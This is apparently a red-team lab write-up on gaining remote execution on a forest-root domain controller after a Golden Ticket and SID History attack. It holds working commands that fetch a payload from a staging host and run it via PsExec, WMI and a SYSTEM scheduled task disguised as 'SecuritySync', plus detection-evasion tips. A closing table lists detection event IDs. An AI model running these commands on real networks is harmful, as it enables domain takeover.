# Parent Domain Remote Execution & Session Management
**Phase:** Cross-Domain Escalation & Remote Execution (Parent Domain Controller)
## 1. Execution Context & The Double-Hop Challenge

Following a successful cross-domain ticket injection (Golden Ticket with Enterprise Admins SID History), the attacker possesses administrative rights across the forest root:

```powershell
# Earlier we did SID Hitory injection and injected the ticket into the current session.
# Verified administrative SMB access
dir \\dc01.warfare.corp\C$
```

### The Interactive Execution Problem

While read/write access to administrative shares (`C$`, `ADMIN$`) is confirmed, running commands interactively across the network presents challenges:

* **Interactive Session Deadlocks:** Running `psexec.exe \\dc01.warfare.corp cmd.exe` directly inside an existing reverse shell typically hangs because standard I/O redirection fails to allocate an interactive pseudo-terminal over a nested stream.

* **Kerberos Double-Hop Restriction:** If attempting to initiate actions that require delegating credentials from Machine A to Machine B, standard NTLM/Kerberos restrictions may prevent re-authentication to a third hop without unconstrained or resource-based constrained delegation.

---

## 2. Remote Execution Workflow (Detached Service Invocation)

To bypass interactive console locks inside an existing shell session, execution is separated into two actions: staging the binary remotely and invoking it asynchronously (detached).

### 2.1 Staging the Binary

In an interactive Windows session, retrieve the binary and stage it on the target Domain Controller's filesystem:

```powershell
# Download payload locally from staging server
Invoke-WebRequest -Uri "[http://10.10.200.2:8000/drev.exe](http://10.10.200.2:8000/drev.exe)" -OutFile "C:\Users\corphead\Documents\drev.exe"

# Stage binary onto target parent DC via administrative share
copy C:\Users\corphead\Documents\drev.exe \\dc01.warfare.corp\C$\Windows\Temp\drev.exe

```

> **OPSEC Note on File Paths:**
> Avoid dropping files directly into root directories (`C:\`). Standard monitoring rules flag anomalous executables written to the filesystem root. Using system staging paths like `C:\Windows\Temp\` or writable application directories helps blend with expected OS activity.

### 2.2 Asynchronous Remote Service Invocation

Using the Sysinternals `PsExec` binary with the `-d` (detach) flag instructs the Service Control Manager to start the process without waiting for standard output redirection:

```cmd
# Execute binary asynchronously without blocking the parent shell
ps.exe -accepteula -d \\dc01.warfare.corp cmd.exe /c "C:\Windows\Temp\drev.exe"

```

* **`-accepteula`**: Automatically bypasses the Sysinternals license prompt (critical for headless execution).
* **`-d`**: Detaches process execution from standard input/output streams, preventing the command prompt from hanging.

---

## 3. Alternative Execution Vectors

Beyond Sysinternals `PsExec`, administrative access over SMB/RPC allows multiple execution mechanisms:

### Method A: WMI / Win32_Process (Agentless)

WMI creates a process without registering a persistent Windows service, reducing detection surface:

```powershell
# Execute via WMI process creation (requires RPC TCP 135 + dynamic high ports)
wmic /node:"dc01.warfare.corp" process call create "C:\Windows\Temp\drev.exe"

```

### Method B: Remote Scheduled Tasks

Scheduled tasks can execute binaries as `NT AUTHORITY\SYSTEM`:

```cmd
# Create and run a one-time task
schtasks /create /s dc01.warfare.corp /tn "SecuritySync" /tr "C:\Windows\Temp\drev.exe" /sc once /st 00:00 /ru "NT AUTHORITY\SYSTEM"
schtasks /run /s dc01.warfare.corp /tn "SecuritySync"
schtasks /delete /s dc01.warfare.corp /tn "SecuritySync" /f

```

---

## 4. Forest Root Verification & Post-Exploitation Checks

Once execution succeeds on `192.168.98.2` (`dc01.warfare.corp`), verify network identity and operational scope:

```powershell
# Identify network interface and routing
ipconfig
# 192.168.98.2 so confirmed we are now Parent DC

# Confirm domain-level administrative scope
net user /dom
whoami /groups

```

### Target Assessment

* **Host Address:** `192.168.98.2`
* **Role:** Forest Root Domain Controller (`warfare.corp`)
* **Impact:** Successful transition from local compromise to forest root dominance via cross-domain ticket generation and remote service execution.

---

## 5. Defensive Visibility & Artifacts

| Action | Artifact / Event ID | Detection Mechanism |
| --- | --- | --- |
| **PsExec Service Installation** | Windows Event ID 7045 / 7036 | Service Control Manager logs creation and state change of ad-hoc services (e.g., `PSEXESVC`). |
| **Share Writes (`C$`, `ADMIN$`)** | Windows Event ID 5140 / 5145 | Network share access checks monitoring administrative share write operations. |
| **SID History Injection** | Windows Event ID 4672 / 4624 | Kerberos authentication tickets carrying unmapped or high-privileged foreign SIDs (`RID 519`). |
| **Process Creation** | Windows Event ID 4688 / Sysmon EID 1 | Anomalous parent-child process chains (e.g., `services.exe` -> `cmd.exe` -> payload). |
